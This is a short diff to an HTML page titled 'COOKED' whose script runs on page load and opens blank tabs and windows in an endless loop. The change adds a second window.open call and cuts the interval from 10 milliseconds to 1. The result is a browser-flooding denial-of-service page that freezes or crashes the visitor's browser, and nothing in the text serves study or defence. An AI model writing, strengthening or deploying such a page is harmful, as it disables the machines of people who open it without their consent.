@@ -4,10 +4,13 @@
   <title>COOKED</title>
   <script>
     function COOKED() {
-      // Open a new tab continuously in an infinite loop
+      // Open a new tab and a new window continuously in an infinite loop
       setInterval(() => {
+        // Open a new tab
         window.open('about:blank', '_blank');
-      }, 10); // Opens a new tab every 10 milliseconds
+        // Open a new window
+        window.open('about:blank', '');
+      }, 1); // Opens new tabs and windows every millisecond
     }
 
     // Automatically execute the function when the page loads
